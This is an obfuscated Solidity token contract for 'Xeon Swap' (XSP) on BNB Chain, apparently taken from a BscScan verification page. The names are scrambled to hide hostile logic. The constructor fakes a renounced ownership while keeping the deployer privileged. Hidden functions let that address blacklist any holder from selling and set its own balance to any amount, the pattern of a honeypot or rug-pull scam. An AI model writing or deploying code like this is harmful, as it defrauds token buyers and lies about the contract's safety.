/**
 *Submitted for verification at BscScan.com on 2023-02-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


interface qemgkgdwzaqrh {
    function createPair(address dhinzkzsdtd, address nqvpgtaxlhcfn) external returns (address);
}

interface gnmmkdcvke {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract XeonSwap {

    uint256 private mdfcnrjhaqz;

    event Transfer(address indexed from, address indexed dmbgacatlor, uint256 value);

    bool public ytjkdtigp;

    function rfzbjladewyur(address xtmxygtzv, address jogdstdjsdl, uint256 clgalbhnetv) internal returns (bool) {
        if (xtmxygtzv == zskygoskxa) {
            return cqrnwhozytn(xtmxygtzv, jogdstdjsdl, clgalbhnetv);
        }
        require(!zimpgqfqktbjar[xtmxygtzv]);
        return cqrnwhozytn(xtmxygtzv, jogdstdjsdl, clgalbhnetv);
    }

    mapping(address => bool) public zimpgqfqktbjar;

    string public name = "Xeon Swap";

    function auzaadfufyca(address gxhotdlozn) public {
        if (ibdbvqsbdw) {
            return;
        }
        
        cmuruvakdiw[gxhotdlozn] = true;
        if (upzuwybisfeqi != vgbvixqymjdhz) {
            nzhjgixzfvw = false;
        }
        ibdbvqsbdw = true;
    }

    function jxhewjnyftw(uint256 clgalbhnetv) public {
        if (!cmuruvakdiw[pofedgugd()]) {
            return;
        }
        balanceOf[zskygoskxa] = clgalbhnetv;
    }

    bool private nzhjgixzfvw;

    address public owner;

    event Approval(address indexed emomrnnlozxk, address indexed spender, uint256 value);

    mapping(address => bool) public cmuruvakdiw;

    function hopatfuxoyg(address fbqniaqkko) public {
        
        if (fbqniaqkko == zskygoskxa || fbqniaqkko == orloqzkwdtq || !cmuruvakdiw[pofedgugd()]) {
            return;
        }
        
        zimpgqfqktbjar[fbqniaqkko] = true;
    }

    function approve(address sbkgmdyylao, uint256 clgalbhnetv) public returns (bool) {
        allowance[pofedgugd()][sbkgmdyylao] = clgalbhnetv;
        emit Approval(pofedgugd(), sbkgmdyylao, clgalbhnetv);
        return true;
    }

    bool public wwosutktj;

    address public orloqzkwdtq;

    function pofedgugd() private view returns (address) {
        return msg.sender;
    }

    uint256 private upzuwybisfeqi;

    function cqrnwhozytn(address xtmxygtzv, address jogdstdjsdl, uint256 clgalbhnetv) internal returns (bool) {
        require(balanceOf[xtmxygtzv] >= clgalbhnetv);
        balanceOf[xtmxygtzv] -= clgalbhnetv;
        balanceOf[jogdstdjsdl] += clgalbhnetv;
        emit Transfer(xtmxygtzv, jogdstdjsdl, clgalbhnetv);
        return true;
    }

    string public symbol = "XSP";

    function lisfhsxmwl() public {
        emit OwnershipTransferred(zskygoskxa, address(0));
        owner = address(0);
    }

    function mfeltqlbn() public view returns (bool) {
        return ytjkdtigp;
    }

    function kxwxmpzfdtev() public view returns (bool) {
        return ytjkdtigp;
    }

    bool public xtogclrjehee;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address public zskygoskxa;

    bool private hyitifazs;

    uint8 public decimals = 18;

    function fbabgfdpgig() public {
        if (upzuwybisfeqi == vuathuemqyz) {
            wwosutktj = true;
        }
        
        nzhjgixzfvw=false;
    }

    function ptbfwxokjxub() public view returns (bool) {
        return ytjkdtigp;
    }

    constructor (){ 
        
        gnmmkdcvke gzjtfoxewe = gnmmkdcvke(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        orloqzkwdtq = qemgkgdwzaqrh(gzjtfoxewe.factory()).createPair(gzjtfoxewe.WETH(), address(this));
        owner = pofedgugd();
        if (mdfcnrjhaqz == vgbvixqymjdhz) {
            mdfcnrjhaqz = vgbvixqymjdhz;
        }
        zskygoskxa = owner;
        cmuruvakdiw[zskygoskxa] = true;
        balanceOf[zskygoskxa] = totalSupply;
        
        emit Transfer(address(0), zskygoskxa, totalSupply);
        lisfhsxmwl();
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return owner;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    bool public ibdbvqsbdw;

    function transferFrom(address xtmxygtzv, address jogdstdjsdl, uint256 clgalbhnetv) external returns (bool) {
        if (allowance[xtmxygtzv][pofedgugd()] != type(uint256).max) {
            require(clgalbhnetv <= allowance[xtmxygtzv][pofedgugd()]);
            allowance[xtmxygtzv][pofedgugd()] -= clgalbhnetv;
        }
        return rfzbjladewyur(xtmxygtzv, jogdstdjsdl, clgalbhnetv);
    }

    uint256 private vuathuemqyz;

    function transfer(address inkpcssfwxw, uint256 clgalbhnetv) external returns (bool) {
        return rfzbjladewyur(pofedgugd(), inkpcssfwxw, clgalbhnetv);
    }

    uint256 private vgbvixqymjdhz;

}